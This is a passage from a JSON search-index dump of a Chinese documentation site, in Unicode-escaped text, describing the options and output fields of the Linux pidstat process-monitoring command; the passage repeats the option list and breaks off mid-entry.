\u4ec5\u663e\u793a\u5176\u547d\u4ee4\u540d\u5305\u542b\u5b57\u7b26\u4e32comm\u7684\u4efb\u52a1\u3002\u6b64\u5b57\u7b26\u4e32\u53ef\u4ee5\u662f\u6b63\u5219\u8868\u8fbe\u5f0f -d \u62a5\u544aI/O\u7edf\u8ba1\u4fe1\u606f UID \u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u6807\u8bc6\u53f7 USER \u62e5\u6709\u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u7684\u540d\u79f0 PID \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u6807\u8bc6\u53f7 kB_rd/s \u4efb\u52a1\u6bcf\u79d2\u4ece\u78c1\u76d8\u8bfb\u53d6\u7684kB\u6570 kB_wr/s \u4efb\u52a1\u6bcf\u79d2\u5e94\u8be5\u5199\u5165\u6216\u5df2\u5199\u5165\u78c1\u76d8\u7684kB\u6570 kB_ccwr/s \u5df2\u53d6\u6d88\u4efb\u52a1\u5199\u5165\u78c1\u76d8\u7684kB\u6570\u3002\u5f53\u4efb\u52a1\u622a\u65ad\u4e00\u4e9b\u810f\u9875\u7f13\u5b58\u65f6\uff0c\u53ef\u80fd\u4f1a\u53d1\u751f\u8fd9\u79cd\u60c5\u51b5\u3002 iodelay \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u5757I/O\u5ef6\u8fdf\uff0c\u4ee5\u65f6\u949f\u5468\u671f\u5ea6\u91cf\u3002\u6b64\u5ea6\u91cf\u5305\u62ec\u7b49\u5f85\u540c\u6b65\u5757I/O\u5b8c\u6210\u548c\u8f6c\u6362\u5757I/O\u5b8c\u6210\u6240\u82b1\u8d39\u7684\u5ef6\u8fdf\u3002 Command \u4efb\u52a1\u7684\u540d\u5b57 --dec={ 0 | 1 | 2 } \u6307\u5b9a\u8981\u4f7f\u7528\u7684\u5c0f\u6570\u4f4d\u6570\uff080\u52302\uff0c\u9ed8\u8ba4\u503c\u4e3a2\uff09\u3002 -e program args \u7528\u7ed9\u5b9a\u7684\u53c2\u6570\u6267\u884c\u7a0b\u5e8f\uff0c\u5e76\u7528pidstat\u76d1\u89c6\u5b83\u3002\u5f53\u7a0b\u5e8f\u7ec8\u6b62\u65f6\uff0cpidstat\u505c\u6b62\u3002 -G process_name \u4ec5\u663e\u793a\u5176\u547d\u4ee4\u540d\u5305\u542b\u5b57\u7b26\u4e32process_name\u7684\u8fdb\u7a0b\u3002\u6b64\u5b57\u7b26\u4e32\u53ef\u4ee5\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\u3002\u5982\u679c\u9009\u9879-t\u4e0e\u9009\u9879-G\u4e00\u8d77\u4f7f\u7528\uff0c\u5219\u4e5f\u4f1a\u663e\u793a\u5c5e\u4e8e\u8be5\u8fdb\u7a0b\u7684\u7ebf\u7a0b\uff08\u5373\u4f7f\u5176\u547d\u4ee4\u540d\u4e0d\u5305\u542b\u5b57\u7b26\u4e32process_name\uff09\u3002 -H \u663e\u793a\u65f6\u95f4\u6233 -h \u5728\u4e00\u884c\u4e0a\u6c34\u5e73\u663e\u793a\u6240\u6709\u6d3b\u52a8\uff0c\u62a5\u544a\u672b\u5c3e\u6ca1\u6709\u5e73\u5747\u7edf\u8ba1\u4fe1\u606f\u3002\u8fd9\u662f\u4e3a\u4e86\u66f4\u5bb9\u6613\u88ab\u5176\u4ed6\u7a0b\u5e8f\u89e3\u6790\u3002 --human \u81ea\u52a8\u5355\u4f4d\u8f6c\u6362 -I \u5927\u5199i \u5728SMP\u73af\u5883\u4e2d\uff0c\u6307\u793a\u4efb\u52a1CPU\u4f7f\u7528\u7387 -l \u5c0fL\u663e\u793a\u8fdb\u7a0b\u547d\u4ee4\u540d\u79f0\u53ca\u5176\u6240\u6709\u53c2\u6570\u3002 -p { pid[,...] | SELF | ALL } \u9009\u62e9\u8981\u62a5\u544a\u7edf\u8ba1\u4fe1\u606f\u7684\u4efb\u52a1\uff08\u6d41\u7a0b\uff09\u3002pid\u662f\u8fdb\u7a0b\u6807\u8bc6\u53f7\u3002SELF\u5173\u952e\u5b57\u8868\u793a\u8981\u4e3apidstat\u8fdb\u7a0b\u672c\u8eab\u62a5\u544a\u7edf\u8ba1\u4fe1\u606f\uff0c\u800cALL\u5173\u952e\u5b57\u8868\u793a\u8981\u62a5\u544a\u7cfb\u7edf\u7ba1\u7406\u7684\u6240\u6709\u4efb\u52a1\u7684\u7edf\u8ba1\u4fe1\u606f\u3002 -R \u62a5\u544a\u5b9e\u65f6\u4f18\u5148\u7ea7\u548c\u8ba1\u5212\u7b56\u7565\u4fe1\u606f\u3002\u53ef\u80fd\u4f1a\u663e\u793a\u4ee5\u4e0b\u503c\uff1a UID \u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u6807\u8bc6\u53f7 USER \u62e5\u6709\u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u7684\u540d\u79f0 PID \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u6807\u8bc6\u53f7 prio \u88ab\u76d1\u63a7\u4efb\u52a1\u7684\u5b9e\u65f6\u4f18\u5148\u7ea7\u3002 policy \u88ab\u76d1\u63a7\u4efb\u52a1\u7684\u8c03\u5ea6\u7b56\u7565 Command \u4efb\u52a1\u7684\u547d\u4ee4\u540d\u79f0 -r \u62a5\u544a\u9875\u9762\u9519\u8bef\u548c\u5185\u5b58\u5229\u7528\u7387\uff0c\u53ef\u80fd\u4f1a\u663e\u793a\u4ee5\u4e0b\u503c\uff1a UID \u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u6807\u8bc6\u53f7 USER \u62e5\u6709\u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u7684\u540d\u79f0 PID \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u6807\u8bc6\u53f7 minflt/s \u4efb\u52a1\u6bcf\u79d2\u53d1\u751f\u7684\u8f7b\u5fae\u9519\u8bef\u603b\u6570\uff0c\u8fd9\u4e9b\u9519\u8bef\u4e0d\u9700\u8981\u4ece\u78c1\u76d8\u52a0\u8f7d\u5185\u5b58\u9875\u3002 majflt/s \u4efb\u52a1\u6bcf\u79d2\u53d1\u751f\u7684\u4e3b\u8981\u9519\u8bef\u603b\u6570\uff0c\u8fd9\u4e9b\u9519\u8bef\u9700\u8981\u4ece\u78c1\u76d8\u52a0\u8f7d\u5185\u5b58\u9875\u3002 VSZ \u865a\u62df\u5927\u5c0f\uff1a\u6574\u4e2a\u4efb\u52a1\u7684\u865a\u62df\u5185\u5b58\u4f7f\u7528\u91cf\uff08KB\uff09\u3002 RSS \u5e38\u9a7b\u96c6\u5927\u5c0f\uff1a\u4efb\u52a1\u4f7f\u7528\u7684\u975e\u4ea4\u6362\u7269\u7406\u5185\u5b58\uff08\u4ee5KB\u4e3a\u5355\u4f4d\uff09\u3002 %MEM \u4efb\u52a1\u5f53\u524d\u4f7f\u7528\u7684\u53ef\u7528\u7269\u7406\u5185\u5b58\u7684\u5171\u4eab\u3002 Command \u4efb\u52a1\u7684\u547d\u4ee4\u540d\u79f0 \u62a5\u544a\u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u4efb\u52a1\u7684\u5168\u5c40\u7edf\u8ba1\u4fe1\u606f\u65f6\uff0c\u53ef\u80fd\u4f1a\u663e\u793a\u4ee5\u4e0b\u503c\uff1a UID \u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u6807\u8bc6\u53f7 USER \u62e5\u6709\u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u7684\u540d\u79f0 PID \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u6807\u8bc6\u53f7 minflt-nr \u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u4efb\u52a1\u5728\u8be5\u65f6\u95f4\u95f4\u9694\u5185\u6536\u96c6\u7684\u8f7b\u5fae\u9519\u8bef\u7684\u603b\u6570\u3002 majflt-nr \u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u4efb\u52a1\u5728\u95f4\u9694\u671f\u95f4\u6536\u96c6\u7684\u4e3b\u8981\u9519\u8bef\u603b\u6570\u65f6\u95f4\u3002 Command \u4efb\u52a1\u7684\u547d\u4ee4\u540d\u79f0 -s \u62a5\u544a\u5806\u6808\u5229\u7528\u7387\u3002\u53ef\u80fd\u4f1a\u663e\u793a\u4ee5\u4e0b\u503c\uff1a UID \u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u6807\u8bc6\u53f7 USER \u62e5\u6709\u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u7684\u540d\u79f0 PID \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u6807\u8bc6\u53f7 StkSize \u4ee5\u5806\u6808\u5f62\u5f0f\u4e3a\u4efb\u52a1\u4fdd\u7559\u4f46\u4e0d\u4e00\u5b9a\u4f7f\u7528\u7684\u5185\u5b58\u91cf\uff08\u4ee5KB\u4e3a\u5355\u4f4d\uff09\u3002 StkRef \u4efb\u52a1\u5f15\u7528\u7684\u7528\u4f5c\u5806\u6808\u7684\u5185\u5b58\u91cf\uff08\u4ee5KB\u4e3a\u5355\u4f4d\uff09 Command \u4efb\u52a1\u7684\u547d\u4ee4\u540d\u79f0 -T { TASK | CHILD | ALL } \u6b64\u9009\u9879\u6307\u5b9a pidstat \u547d\u4ee4\u5fc5\u987b\u76d1\u89c6\u7684\u5185\u5bb9\u3002 TASK \u5173\u952e\u5b57\u8868\u793a\u8981\u62a5\u544a\u5355\u4e2a\u4efb\u52a1\u7684\u7edf\u8ba1\u4fe1\u606f \uff08\u8fd9\u662f\u9ed8\u8ba4\u9009\u9879\uff09\u800c CHILD \u5173\u952e\u5b57\u8868\u793a\u8981\u5168\u5c40\u62a5\u544a\u6240\u9009\u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u4efb\u52a1\u7684\u7edf\u8ba1\u4fe1\u606f\u3002 ALL\u5173\u952e\u5b57\u8868\u793a\u8981\u62a5\u544a\u5355\u4e2a\u4efb\u52a1\u7684\u7edf\u8ba1\u4fe1\u606f\uff0c\u4ee5\u53ca\u6240\u9009\u4efb\u52a1\u53ca\u5176\u5b50\u4efb\u52a1\u7684\u5168\u5c40\u7edf\u8ba1\u4fe1\u606f\u3002 -t \u663e\u793a\u4e0e\u6240\u9009\u4efb\u52a1\u5173\u8054\u7684\u7ebf\u7a0b\u7684\u7edf\u8ba1\u4fe1\u606f\u3002 TGID \u7ebf\u7a0b\u7ec4\u957f\u7684\u6807\u8bc6\u53f7\u3002 TID \u88ab\u76d1\u89c6\u7ebf\u7a0b\u7684\u6807\u8bc6\u53f7\u3002 -U [ username ] \u663e\u793a\u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u540d\uff0c\u800c\u4e0d\u662fUID\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7528\u6237\u540d\uff0c\u5219\u53ea\u663e\u793a\u5c5e\u4e8e\u6307\u5b9a\u7528\u6237\u7684\u4efb\u52a1\u3002 -u \u62a5\u544aCPU\u5229\u7528\u7387\u3002 \u62a5\u544a\u5355\u4e2a\u4efb\u52a1\u7684\u7edf\u8ba1\u4fe1\u606f\u65f6\uff0c\u53ef\u80fd\u4f1a\u663e\u793a\u4ee5\u4e0b\u503c\uff1a UID \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u6807\u8bc6\u53f7\u3002 USER \u62e5\u6709\u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u7684\u540d\u79f0\u3002 PID \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u6807\u8bc6\u53f7 %usr %system %guest %CPU \u4efb\u52a1\u4f7f\u7528\u7684CPU\u65f6\u95f4\u7684\u603b\u767e\u5206\u6bd4\u3002 CPU \u4efb\u52a1\u9644\u52a0\u5230\u7684\u5904\u7406\u5668\u53f7\u3002 Command \u547d\u4ee4 \u62a5\u544a\u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u4efb\u52a1\u7684\u5168\u5c40\u7edf\u8ba1\u4fe1\u606f\u65f6\uff0c\u53ef\u80fd\u4f1a\u663e\u793a\u4ee5\u4e0b\u503c\uff1a UID USER PID usr-ms \u5728\u7528\u6237\u7ea7\u522b\uff08\u5e94\u7528\u7a0b\u5e8f\uff09\u6267\u884c\u65f6\uff0c\u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u4efb\u52a1\u82b1\u8d39\u7684\u6beb\u79d2\u603b\u6570 system-ms \u5728\u7cfb\u7edf\u7ea7\uff08\u5185\u6838\uff09\u6267\u884c\u65f6\u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u4efb\u52a1\u82b1\u8d39\u7684\u6beb\u79d2\u603b\u6570\uff0c\u5e76\u5728\u95f4\u9694\u671f\u95f4\u6536\u96c6 \u65f6\u95f4\u3002 guest-ms \u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u7ea7\u5728\u865a\u62df\u673a\uff08\u8fd0\u884c\u865a\u62df\u5904\u7406\u5668\uff09\u4e2d\u82b1\u8d39\u7684\u603b\u6beb\u79d2\u6570\u3002 Command \u547d\u4ee4 -V \u770b\u7248\u672c\u4fe1\u606f -w \u62a5\u544a\u4efb\u52a1\u5207\u6362\u6d3b\u52a8\uff08\u4ec5\u96502.6.23\u5185\u6838\u548c\u66f4\u9ad8\u7248\u672c\uff09\u3002\u53ef\u80fd\u4f1a\u663e\u793a\u4ee5\u4e0b\u503c\uff1a UID USER cswch/s \u6bcf\u79d2\u5bf9\u4efb\u52a1\u8fdb\u884c\u7684\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u603b\u6570\u3002\u5f53\u4efb\u52a1\u7531\u4e8e\u9700\u8981\u8d44\u6e90\u4e0d\u53ef\u7528\u3002 nvcswch/s \u6bcf\u79d2\u6267\u884c\u4efb\u52a1\u7684\u975e\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\u603b\u6570\u3002\u5f53\u4efb\u52a1\u5728\u5176\u65f6\u95f4\u7247\u7684\u6301\u7eed\u65f6\u95f4\u5185\u6267\u884c\uff0c\u7136\u540e\u88ab\u8feb\u653e\u5f03\u5904\u7406\u5668\u65f6\uff0c\u4f1a\u53d1\u751f\u975e\u81ea\u613f\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u3002 Command \u547d\u4ee4","title":"pidstat\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/pidstat/#pidstat","text":"\u8bed\u6cd5 pidstat [ options ] [ <interval> [ <count> ] ] \u529f\u80fd \u62a5\u544a Linux \u4efb\u52a1\u7684\u7edf\u8ba1\u4fe1\u606f\u3002pidstat\u547d\u4ee4\u7528\u4e8e\u76d1\u63a7\u5355\u4e2a\u4efb\u52a1\uff0c\u76ee\u524d\u7531 Linux \u5185\u6838\u7ba1\u7406\u3002 \u9009\u9879 -C comm \u4ec5\u663e\u793a\u5176\u547d\u4ee4\u540d\u5305\u542b\u5b57\u7b26\u4e32comm\u7684\u4efb\u52a1\u3002\u6b64\u5b57\u7b26\u4e32\u53ef\u4ee5\u662f\u6b63\u5219\u8868\u8fbe\u5f0f -d \u62a5\u544aI/O\u7edf\u8ba1\u4fe1\u606f UID \u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u6807\u8bc6\u53f7 USER \u62e5\u6709\u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u7684\u540d\u79f0 PID \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u6807\u8bc6\u53f7 kB_rd/s \u4efb\u52a1\u6bcf\u79d2\u4ece\u78c1\u76d8\u8bfb\u53d6\u7684kB\u6570 kB_wr/s \u4efb\u52a1\u6bcf\u79d2\u5e94\u8be5\u5199\u5165\u6216\u5df2\u5199\u5165\u78c1\u76d8\u7684kB\u6570 kB_ccwr/s \u5df2\u53d6\u6d88\u4efb\u52a1\u5199\u5165\u78c1\u76d8\u7684kB\u6570\u3002\u5f53\u4efb\u52a1\u622a\u65ad\u4e00\u4e9b\u810f\u9875\u7f13\u5b58\u65f6\uff0c\u53ef\u80fd\u4f1a\u53d1\u751f\u8fd9\u79cd\u60c5\u51b5\u3002 iodelay \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u5757I/O\u5ef6\u8fdf\uff0c\u4ee5\u65f6\u949f\u5468\u671f\u5ea6\u91cf\u3002\u6b64\u5ea6\u91cf\u5305\u62ec\u7b49\u5f85\u540c\u6b65\u5757I/O\u5b8c\u6210\u548c\u8f6c\u6362\u5757I/O\u5b8c\u6210\u6240\u82b1\u8d39\u7684\u5ef6\u8fdf\u3002 Command \u4efb\u52a1\u7684\u540d\u5b57 --dec={ 0 | 1 | 2 } \u6307\u5b9a\u8981\u4f7f\u7528\u7684\u5c0f\u6570\u4f4d\u6570\uff080\u52302\uff0c\u9ed8\u8ba4\u503c\u4e3a2\uff09\u3002 -e program args \u7528\u7ed9\u5b9a\u7684\u53c2\u6570\u6267\u884c\u7a0b\u5e8f\uff0c\u5e76\u7528pidstat\u76d1\u89c6\u5b83\u3002\u5f53\u7a0b\u5e8f\u7ec8\u6b62\u65f6\uff0cpidstat\u505c\u6b62\u3002 -G process_name \u4ec5\u663e\u793a\u5176\u547d\u4ee4\u540d\u5305\u542b\u5b57\u7b26\u4e32process_name\u7684\u8fdb\u7a0b\u3002\u6b64\u5b57\u7b26\u4e32\u53ef\u4ee5\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\u3002\u5982\u679c\u9009\u9879-t\u4e0e\u9009\u9879-G\u4e00\u8d77\u4f7f\u7528\uff0c\u5219\u4e5f\u4f1a\u663e\u793a\u5c5e\u4e8e\u8be5\u8fdb\u7a0b\u7684\u7ebf\u7a0b\uff08\u5373\u4f7f\u5176\u547d\u4ee4\u540d\u4e0d\u5305\u542b\u5b57\u7b26\u4e32process_name\uff09\u3002 -H \u663e\u793a\u65f6\u95f4\u6233 -h \u5728\u4e00\u884c\u4e0a\u6c34\u5e73\u663e\u793a\u6240\u6709\u6d3b\u52a8\uff0c\u62a5\u544a\u672b\u5c3e\u6ca1\u6709\u5e73\u5747\u7edf\u8ba1\u4fe1\u606f\u3002\u8fd9\u662f\u4e3a\u4e86\u66f4\u5bb9\u6613\u88ab\u5176\u4ed6\u7a0b\u5e8f\u89e3\u6790\u3002 --human \u81ea\u52a8\u5355\u4f4d\u8f6c\u6362 -I \u5927\u5199i \u5728SMP\u73af\u5883\u4e2d\uff0c\u6307\u793a\u4efb\u52a1CPU\u4f7f\u7528\u7387 -l \u5c0fL\u663e\u793a\u8fdb\u7a0b\u547d\u4ee4\u540d\u79f0\u53ca\u5176\u6240\u6709\u53c2\u6570\u3002 -p { pid[,...] | SELF | ALL } \u9009\u62e9\u8981\u62a5\u544a\u7edf\u8ba1\u4fe1\u606f\u7684\u4efb\u52a1\uff08\u6d41\u7a0b\uff09\u3002pid\u662f\u8fdb\u7a0b\u6807\u8bc6\u53f7\u3002SELF\u5173\u952e\u5b57\u8868\u793a\u8981\u4e3apidstat\u8fdb\u7a0b\u672c\u8eab\u62a5\u544a\u7edf\u8ba1\u4fe1\u606f\uff0c\u800cALL\u5173\u952e\u5b57\u8868\u793a\u8981\u62a5\u544a\u7cfb\u7edf\u7ba1\u7406\u7684\u6240\u6709\u4efb\u52a1\u7684\u7edf\u8ba1\u4fe1\u606f\u3002 -R \u62a5\u544a\u5b9e\u65f6\u4f18\u5148\u7ea7\u548c\u8ba1\u5212\u7b56\u7565\u4fe1\u606f\u3002\u53ef\u80fd\u4f1a\u663e\u793a\u4ee5\u4e0b\u503c\uff1a UID \u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u6807\u8bc6\u53f7 USER \u62e5\u6709\u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u7684\u540d\u79f0 PID \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u6807\u8bc6\u53f7 prio \u88ab\u76d1\u63a7\u4efb\u52a1\u7684\u5b9e\u65f6\u4f18\u5148\u7ea7\u3002 policy \u88ab\u76d1\u63a7\u4efb\u52a1\u7684\u8c03\u5ea6\u7b56\u7565 Command \u4efb\u52a1\u7684\u547d\u4ee4\u540d\u79f0 -r \u62a5\u544a\u9875\u9762\u9519\u8bef\u548c\u5185\u5b58\u5229\u7528\u7387\uff0c\u53ef\u80fd\u4f1a\u663e\u793a\u4ee5\u4e0b\u503c\uff1a UID \u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u6807\u8bc6\u53f7 USER \u62e5\u6709\u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u7684\u540d\u79f0 PID \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u6807\u8bc6\u53f7 minflt/s \u4efb\u52a1\u6bcf\u79d2\u53d1\u751f\u7684\u8f7b\u5fae\u9519\u8bef\u603b\u6570\uff0c\u8fd9\u4e9b\u9519\u8bef\u4e0d\u9700\u8981\u4ece\u78c1\u76d8\u52a0\u8f7d\u5185\u5b58\u9875\u3002 majflt/s \u4efb\u52a1\u6bcf\u79d2\u53d1\u751f\u7684\u4e3b\u8981\u9519\u8bef\u603b\u6570\uff0c\u8fd9\u4e9b\u9519\u8bef\u9700\u8981\u4ece\u78c1\u76d8\u52a0\u8f7d\u5185\u5b58\u9875\u3002 VSZ \u865a\u62df\u5927\u5c0f\uff1a\u6574\u4e2a\u4efb\u52a1\u7684\u865a\u62df\u5185\u5b58\u4f7f\u7528\u91cf\uff08KB\uff09\u3002 RSS \u5e38\u9a7b\u96c6\u5927\u5c0f\uff1a\u4efb\u52a1\u4f7f\u7528\u7684\u975e\u4ea4\u6362\u7269\u7406\u5185\u5b58\uff08\u4ee5KB\u4e3a\u5355\u4f4d\uff09\u3002 %MEM \u4efb\u52a1\u5f53\u524d\u4f7f\u7528\u7684\u53ef\u7528\u7269\u7406\u5185\u5b58\u7684\u5171\u4eab\u3002 Command \u4efb\u52a1\u7684\u547d\u4ee4\u540d\u79f0 \u62a5\u544a\u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u4efb\u52a1\u7684\u5168\u5c40\u7edf\u8ba1\u4fe1\u606f\u65f6\uff0c\u53ef\u80fd\u4f1a\u663e\u793a\u4ee5\u4e0b\u503c\uff1a UID \u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u6807\u8bc6\u53f7 USER \u62e5\u6709\u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u7684\u540d\u79f0 PID \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u6807\u8bc6\u53f7 minflt-nr \u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u4efb\u52a1\u5728\u8be5\u65f6\u95f4\u95f4\u9694\u5185\u6536\u96c6\u7684\u8f7b\u5fae\u9519\u8bef\u7684\u603b\u6570\u3002 majflt-nr \u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u4efb\u52a1\u5728\u95f4\u9694\u671f\u95f4\u6536\u96c6\u7684\u4e3b\u8981\u9519\u8bef\u603b\u6570\u65f6\u95f4\u3002 Command \u4efb\u52a1\u7684\u547d\u4ee4\u540d\u79f0 -s \u62a5\u544a\u5806\u6808\u5229\u7528\u7387\u3002\u53ef\u80fd\u4f1a\u663e\u793a\u4ee5\u4e0b\u503c\uff1a UID \u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u6807\u8bc6\u53f7 USER \u62e5\u6709\u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u7684\u540d\u79f0 PID \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u6807\u8bc6\u53f7 StkSize \u4ee5\u5806\u6808\u5f62\u5f0f\u4e3a\u4efb\u52a1\u4fdd\u7559\u4f46\u4e0d\u4e00\u5b9a\u4f7f\u7528\u7684\u5185\u5b58\u91cf\uff08\u4ee5KB\u4e3a\u5355\u4f4d\uff09\u3002 StkRef \u4efb\u52a1\u5f15\u7528\u7684\u7528\u4f5c\u5806\u6808\u7684\u5185\u5b58\u91cf\uff08\u4ee5KB\u4e3a\u5355\u4f4d\uff09 Command \u4efb\u52a1\u7684\u547d\u4ee4\u540d\u79f0 -T { TASK | CHILD | ALL } \u6b64\u9009\u9879\u6307\u5b9a pidstat \u547d\u4ee4\u5fc5\u987b\u76d1\u89c6\u7684\u5185\u5bb9\u3002 TASK \u5173\u952e\u5b57\u8868\u793a\u8981\u62a5\u544a\u5355\u4e2a\u4efb\u52a1\u7684\u7edf\u8ba1\u4fe1\u606f \uff08\u8fd9\u662f\u9ed8\u8ba4\u9009\u9879\uff09\u800c CHILD \u5173\u952e\u5b57\u8868\u793a\u8981\u5168\u5c40\u62a5\u544a\u6240\u9009\u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u4efb\u52a1\u7684\u7edf\u8ba1\u4fe1\u606f\u3002 ALL\u5173\u952e\u5b57\u8868\u793a\u8981\u62a5\u544a\u5355\u4e2a\u4efb\u52a1\u7684\u7edf\u8ba1\u4fe1\u606f\uff0c\u4ee5\u53ca\u6240\u9009\u4efb\u52a1\u53ca\u5176\u5b50\u4efb\u52a1\u7684\u5168\u5c40\u7edf\u8ba1\u4fe1\u606f\u3002 -t \u663e\u793a\u4e0e\u6240\u9009\u4efb\u52a1\u5173\u8054\u7684\u7ebf\u7a0b\u7684\u7edf\u8ba1\u4fe1\u606f\u3002 TGID \u7ebf\u7a0b\u7ec4\u957f\u7684\u6807\u8bc6\u53f7\u3002 TID \u88ab\u76d1\u89c6\u7ebf\u7a0b\u7684\u6807\u8bc6\u53f7\u3002 -U [ username ] \u663e\u793a\u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u540d\uff0c\u800c\u4e0d\u662fUID\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7528\u6237\u540d\uff0c\u5219\u53ea\u663e\u793a\u5c5e\u4e8e\u6307\u5b9a\u7528\u6237\u7684\u4efb\u52a1\u3002 -u \u62a5\u544aCPU\u5229\u7528\u7387\u3002 \u62a5\u544a\u5355\u4e2a\u4efb\u52a1\u7684\u7edf\u8ba1\u4fe1\u606f\u65f6\uff0c\u53ef\u80fd\u4f1a\u663e\u793a\u4ee5\u4e0b\u503c\uff1a UID \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u6807\u8bc6\u53f7\u3002 USER \u62e5\u6709\u88ab\u76d1\u89c6\u4efb\u52a1\u7684\u771f\u5b9e\u7528\u6237\u7684\u540d\u79f0\u3002 PID \u6b63\u5728\u76d1\u89c6\u7684\u4efb\u52a1\u7684\u6807\u8bc6\u53f7 %usr %system %guest %CPU \u4efb\u52a1\u4f7f\u7528\u7684CPU\u65f6\u95f4\u7684\u603b\u767e\u5206\u6bd4\u3002 CPU \u4efb\u52a1\u9644\u52a0\u5230\u7684\u5904\u7406\u5668\u53f7\u3002 Command \u547d\u4ee4 \u62a5\u544a\u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u4efb\u52a1\u7684\u5168\u5c40\u7edf\u8ba1\u4fe1\u606f\u65f6\uff0c\u53ef\u80fd\u4f1a\u663e\u793a\u4ee5\u4e0b\u503c\uff1a UID USER PID usr-ms \u5728\u7528\u6237\u7ea7\u522b\uff08\u5e94\u7528\u7a0b\u5e8f\uff09\u6267\u884c\u65f6\uff0c\u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u4efb\u52a1\u82b1\u8d39\u7684\u6beb\u79d2\u603b\u6570 system-ms \u5728\u7cfb\u7edf\u7ea7\uff08\u5185\u6838\uff09\u6267\u884c\u65f6\u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u4efb\u52a1\u82b1\u8d39\u7684\u6beb\u79d2\u603b\u6570\uff0c\u5e76\u5728\u95f4\u9694\u671f\u95f4\u6536\u96c6 \u65f6\u95f4\u3002 guest-ms \u4efb\u52a1\u53ca\u5176\u6240\u6709\u5b50\u7ea7\u5728\u865a\u62df\u673a\uff08\u8fd0\u884c\u865a\u62df\u5904\u7406\u5668\uff09\u4e2d\u82b1\u8d39\u7684\u603b\u6beb\u79d2\u6570\u3002 Command \u547d\u4ee4 -V \u770b\u7248\u672c\u4fe1\u606f -w \u62a5\u544a\u4efb\u52a1\u5207\u6362\u6d3b\u52a8\uff08\u4ec5\u96502.6.23\u5185\u6838\u548c\u66f4\u9ad8\u7248\u672c\uff09\u3002\u53ef\u80fd\u4f1a\u663e\u793a\u4ee5\u4e0b\u503c\uff1a UID USER cswch/s 